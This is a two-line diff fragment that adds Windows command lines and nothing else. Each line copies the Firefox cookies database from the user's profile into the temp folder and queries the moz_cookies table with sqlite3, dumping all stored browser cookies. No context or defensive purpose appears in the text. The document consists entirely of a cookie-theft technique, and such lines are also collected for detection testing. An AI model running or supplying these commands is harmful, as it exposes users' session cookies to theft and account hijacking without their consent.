@@ -1,0 +1,2 @@
+cmd.exe /c copy "%APPDATA%\Mozilla\Firefox\Profiles\.default-release\cookies.sqlite" %TEMP%\temp_data.db && sqlite3.exe %TEMP%\temp_data.db "SELECT * FROM moz_cookies;"
+copy "%APPDATA%\Mozilla\Firefox\Profiles\xxxxx.default-release\cookies.sqlite" "%TEMP%\c.db" && sqlite3.exe "%TEMP%\c.db" "SELECT * FROM moz_cookies;"
